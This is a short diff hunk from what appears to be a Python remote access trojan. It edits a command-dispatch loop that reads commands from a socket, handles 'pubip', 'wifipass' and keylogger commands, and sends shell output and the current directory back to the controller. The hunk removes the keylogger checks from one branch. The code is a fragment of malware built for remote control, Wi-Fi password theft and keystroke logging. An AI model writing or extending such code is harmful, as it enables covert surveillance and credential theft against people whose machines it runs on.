@@ -404,7 +404,7 @@ def run_commands():
                         connection.send(str.encode(str(something)))
                         break
 
-            elif "pubip" not in ldata and "wifipass" not in ldata and "wifi pass" not in ldata and "keylogger start" not in ldata and "keylogger get" not in ldata and "keylogger end" not in ldata:
+            elif "pubip" not in ldata and "wifipass" not in ldata and "wifi pass" not in ldata:
                 if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
                     connection.send(str.encode(
                         str(output_str) + str(os.getcwd()) + '> '))
